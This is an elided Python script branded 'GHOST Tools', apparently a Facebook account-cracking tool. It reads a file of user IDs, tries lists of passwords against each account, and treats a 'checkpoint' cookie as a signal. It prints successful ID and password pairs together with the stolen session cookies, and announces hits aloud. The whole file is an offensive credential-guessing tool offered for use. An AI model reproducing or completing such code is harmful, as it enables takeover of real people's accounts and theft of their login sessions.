...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mGHOST')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'GHOST' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  GHOST,  Tools"')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m
...
╠══[Github                   • \33[1;38mGHOST-404      ║\33[1;34m   
...
def login():
	banner()
	GHOSTj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	GHOSTj('\033[0;97m===============================================')
	GHOST= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if GHOST in ['m']:
		public()
	elif GHOST in ['1']:
		crack_file()
...
def crack_file():
	...
	print('\033[1;32m[ input File Example:  /sdcard/king.txt  Etc...]')
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN Success\n\x1b[1;97m [1] METHOD GHOST')
	os.system('espeak -a 300 " 1,  method,  GHOST"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[GHOST-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#GHOST
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•GHOST-Cp] {idf} • {pw}')     
				...
				#GHOST
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•GHOST-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " GHOST,  Ok,  id"')
